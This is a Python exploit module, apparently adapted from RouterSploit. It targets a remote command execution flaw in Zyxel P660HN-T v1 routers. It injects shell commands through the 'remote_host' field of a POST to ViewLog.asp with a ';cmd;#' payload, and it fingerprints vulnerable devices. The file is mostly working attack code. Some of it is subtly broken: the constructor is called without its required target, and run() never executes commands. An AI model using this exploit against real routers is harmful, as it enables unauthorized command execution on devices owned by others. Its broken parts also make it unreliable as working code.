target = ""
# rsf exploit module
# description: Module exploits Remote Command Execution vulnerability in Zyxel P660HN-T v1 devices. If the target is vulnerable it allows to execute commands on operating system level.

import requests

class Exploit:
    __info__ = {
        "name": "Zyxel P660HN-T v1 RCE",
        "description": "Module exploits Remote Command Execution vulnerability in Zyxel P660HN-T v1 devices. If the target is vulnerable it allows to execute commands on operating system level.",
        "authors": ("Pedro Ribeiro <pedrib[at]gmail.com>", "Marcin Bury <marcin[at]threat9.com>"),
        "references": (
            "http://seclists.org/fulldisclosure/2017/Jan/40",
            "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt",
            "https://blogs.securiteam.com/index.php/archives/2910",
        ),
        "devices": ("Zyxel P660HN-T v1",),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        if self.check():
            print("Target appears to be vulnerable")
            print("Invoking command loop...")
        else:
            print("Target seems to be not vulnerable")

    def execute(self, cmd):
        payload = f";{cmd};#"
        data = {
            "remote_submit_Flag": "1",
            "remote_syslog_Flag": "1",
            "RemoteSyslogSupported": "1",
            "LogFlag": "0",
            "remote_host": payload,
            "remoteSubmit": "Save"
        }
        requests.post(f'http://{self.target}:{self.port}/cgi-bin/ViewLog.asp', data=data)

    def check(self):
        response = requests.get(f'http://{self.target}:{self.port}/cgi-bin/authorize.asp')
        if response.status_code == 200 and "ZyXEL P-660HN-T1A" in response.text:
            return True
        return False




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
